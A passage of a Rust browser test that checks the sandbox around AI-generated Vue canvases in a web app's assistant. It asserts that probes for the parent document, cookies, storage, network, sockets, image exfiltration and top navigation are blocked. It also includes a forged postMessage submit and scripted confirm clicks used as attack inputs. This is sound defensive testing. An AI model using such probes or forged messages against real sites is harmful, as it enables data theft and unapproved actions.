            browser.eval("moqui.assist.state.bootstrap.agents.find((agent) => agent.agentId === 'assist').dialects.map((d) => d.name).join(',')"),
            "openui,vue-sfc"
        );
        // the frame document: its own policy, no network, sandboxed, framed by this site only
        let headers = browser.eval(
            "fetch('/assist/sandbox?v=1').then((r) => r.text().then((body) => ({status: r.status, csp: r.headers.get('content-security-policy'), \
             type: r.headers.get('content-type'), xfo: r.headers.get('x-frame-options'), body})))",
        );
        assert_eq!(headers["status"], 200, "{headers}");
        let csp = headers["csp"].as_str().unwrap_or_default();
        for directive in ["sandbox allow-scripts;", "connect-src 'none'", "form-action 'none'", "frame-src 'none'", &format!("frame-ancestors 'self' {base}")] {
            assert!(csp.contains(directive), "{directive} is not in {csp}");
        }
        assert!(headers["xfo"].is_null(), "{headers}");
        assert!(headers["body"].as_str().unwrap_or_default().contains("/js/WebrootAssistSandbox.js?v=1"));

        open_drawer(&mut browser);
        fake::script(
            ENDPOINT,
            vec![
                tool_call("s1", "skill", json!({"name": "vue-sfc"})),
                tool_call("w1", "write_ui", json!({"kind": "vue-sfc", "title": "Sandbox probes", "program": PROBE})),
                Reply::text("The probe canvas is open."),
            ],
        );
        send(&mut browser, "Show the sandbox probes in a Vue canvas");
        let frame = "document.querySelector('#m-assist-canvas [data-assist-sfc-frame]')";
        browser.wait_for("the canvas's frame", &format!("!!{frame}"), WAIT);
        assert_eq!(browser.eval(&format!("{frame}.getAttribute('sandbox')")), "allow-scripts");
        assert_eq!(browser.eval(&format!("{frame}.hasAttribute('srcdoc')")), false);
        assert_eq!(browser.eval(&format!("{frame}.getAttribute('referrerpolicy')")), "no-referrer");
        assert_eq!(browser.eval(&format!("{frame}.getAttribute('src').indexOf('/assist/sandbox?v=')")), 0);

        // the probes, as the frame reported them through its one channel and the page posted them to the server
        let start = std::time::Instant::now();
        let probes = loop {
            let state = canvas_data(&gate)["state"]["probes"].as_str().unwrap_or_default().to_string();
            if !state.is_empty() {
                break serde_json::from_str::<serde_json::Value>(&state).unwrap();
            }
            assert!(start.elapsed() < WAIT, "the probes did not come back: {}", canvas_data(&gate));
            browser.pump(Duration::from_millis(300));
        };
        for name in [
            "parentDocument", "topLocation", "cookie", "localStorage", "sessionStorage", "moquiGlobal", "openWindow", "navigateTop", "fetch",
            "xhr", "socket", "imageOther", "imageSite", "form",
        ] {
            assert_eq!(probes[name], "blocked", "{name}: {probes}");
        }
        assert_eq!(probes["webrtc"], "blocked", "WebRTC is removed: {probes}");
        assert_eq!(probes["origin"], "null", "an opaque origin: {probes}");
        assert_eq!(probes["readList"], "rows ADMIN", "the one declared read answers: {probes}");
        let refused = |name: &str| probes[name].as_str().unwrap_or_default().starts_with("refused:");
        assert!(refused("readWrite") && refused("readDots") && refused("readHost") && refused("readUndeclared"), "{probes}");
        let write_read = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/read') >= 0 && f.url.indexOf('updateEnumType') >= 0).map((f) => f.status)");
        assert_eq!(write_read, json!([403]), "the read of the transition that writes is refused");
        // three /apps reads reached the proxy: the declared list (200), the writing transition and the undeclared list (both 403);
        // the .. and host paths never left the page
        let reads: serde_json::Value = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/read') >= 0).map((f) => f.status).sort()");
        assert_eq!(reads, json!([200, 403, 403]), "{reads}");
        // a submit with no click is ignored: no confirm, nothing saved, and the page says so; and a reported free-text
        // problem never becomes an auto-started turn (only fixed-code compile and sandbox reasons revalidate)
        assert_eq!(probes["autoSubmit"], "ignored", "{probes}");
        assert_eq!(browser.eval("document.querySelectorAll('[data-assist-sfc-confirm]').length"), 0);
        assert_ne!(browser.eval("document.querySelector('.m-assist-vue-sfc').getAttribute('data-assist-sfc-ignored')"), "0");
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
        // nor does a message posted to the page's window, outside the channel, reach anything
        browser.eval("window.postMessage({t: 'submit', id: 'x1', action: 'save', values: {description: 'Posted'}}, '*'), true");
        browser.pump(Duration::from_millis(500));
        assert_eq!(browser.eval("document.querySelectorAll('[data-assist-sfc-confirm]').length"), 0);
        browser.wait_for("the answer", &format!("{ANSWERS}.indexOf('The probe canvas is open.') >= 0"), WAIT);
        shots(&mut browser, "sfc");

        // the user's click on the frame's button: a confirm outside the frame shows what it saves
        let in_frame = format!(
            "({{ scrollIntoView() {{ {frame}.scrollIntoView({{block: 'start'}}); }}, \
             getBoundingClientRect() {{ const r = {frame}.getBoundingClientRect(); return {{left: r.left + 20, top: r.top + 12, width: 40, height: 30}}; }} }})"
        );
        browser.click("the frame's Save", &in_frame);
        let confirm = "document.querySelector('[data-assist-sfc-confirm=save]')";
        browser.wait_for(
            "the confirm of the frame's submit",
            &format!("!!{confirm} && {confirm}.innerText.indexOf('Clicked in the frame') >= 0 && {confirm}.innerText.indexOf('saves: updateEnumType') >= 0"),
            WAIT,
        );
        assert_eq!(field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description"), "Before");
        // the confirm is a modal dialog with Cancel focused, and Save is dead until it has been still for a moment (anti-clickjacking)
        assert!(browser.eval("!!document.querySelector('.q-dialog [data-assist-sfc-confirm=save]')").as_bool().unwrap_or(false), "the confirm is a dialog");
        // a scripted click on Save, and one while Save is still disabled, do nothing
        browser.eval("document.querySelector('[data-assist-sfc-confirm-save]').click(), true");
        browser.pump(Duration::from_millis(800));
        assert_eq!(browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/assist/canvasAction') >= 0).length"), 0);
        browser.wait_for("Save armed", "!document.querySelector('[data-assist-sfc-confirm-save]').hasAttribute('disabled')", WAIT);
        browser.click("Save on the confirm", "document.querySelector('[data-assist-sfc-confirm-save]')");
        let start = std::time::Instant::now();
        while field_of(&gate, "moqui.basic.EnumerationType", "enumTypeId", "AST_GATE", "description") != "Clicked in the frame" {
            assert!(start.elapsed() < WAIT, "the confirmed submit did not save");
            browser.pump(Duration::from_millis(200));
        }
        browser.wait_for("the confirm closed", "document.querySelectorAll('[data-assist-sfc-confirm]').length === 0", WAIT);
        let action = super::fetched(&mut browser, "the canvas action", "/assist/canvasAction");
        assert_eq!(action["status"], 200, "{action}");

        // the user allows other sites: the frame restarts and may now load another site's image, but the proxy refuses
        // every read, so a read cannot be carried out in an image URL
        browser.click("Other sites", "document.querySelector('[data-assist-sfc-external] [role=switch], [data-assist-sfc-external]')");
        let start = std::time::Instant::now();
        let external_probes = loop {
            let state = canvas_data(&gate)["state"]["probes"].as_str().unwrap_or_default().to_string();
            if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&state) {
                if parsed["readList"] != "rows ADMIN" {
                    break parsed;
                }
            }
            assert!(start.elapsed() < WAIT, "the frame did not restart with other sites on: {}", canvas_data(&gate));
            browser.pump(Duration::from_millis(300));
        };
        assert!(
            external_probes["readList"].as_str().unwrap_or_default().contains("ERR") || external_probes["readList"].as_str().unwrap_or_default().contains("refused"),
            "a read is refused while other sites are on: {external_probes}"
        );
        // turn it back off (the next canvas does not read, so the pref need not matter, but leave it clean)
        browser.click("Other sites off", "document.querySelector('[data-assist-sfc-external] [role=switch], [data-assist-sfc-external]')");

        // a canvas that navigates its own frame: closed, and recorded as a problem of the sandbox section
        fake::script(
            ENDPOINT,
            vec![
                tool_call("w2", "write_ui", json!({"kind": "vue-sfc", "title": "Leaves", "program": NAVIGATES})),
                Reply::text("The second canvas is open."),
                Reply::text("It will not navigate again."),
            ],
        );
        send(&mut browser, "Show the second canvas");
        browser.wait_for(
            "the frame closed by the watchdog",
            "(document.querySelector('[data-assist-sfc-killed]') || {getAttribute() { return null; }}).getAttribute('data-assist-sfc-killed') === 'navigation'",
            WAIT,
        );
        assert_eq!(browser.eval(&format!("!!{frame}")), false, "the frame is gone");
        let start = std::time::Instant::now();
        loop {
            let data = canvas_data(&gate);
            let problems = data["problems"].as_array().cloned().unwrap_or_default();
            if problems.iter().any(|problem| problem["skill"] == "vue-sfc#sandbox" && problem["problem"].as_str().unwrap_or_default().contains("navigated")) {
                break;
            }
            assert!(start.elapsed() < WAIT, "the navigation was not recorded: {data}");
            browser.pump(Duration::from_millis(300));
        }
        shots(&mut browser, "sfc-killed");
        // the page's console has only the read proxy's 403s for the probes' refused reads (the writing transition and the
        // undeclared list); the frame's own CSP reports are in its process
        let problems: Vec<_> = browser
            .take_problems()
            .into_iter()
            .filter(|problem| !(problem.text.contains("status of 403") && problem.text.contains("/assist/read")))
            .collect();
        assert!(problems.is_empty(), "the Vue SFC canvas: the console is not clean: {problems:#?}");
    }
}
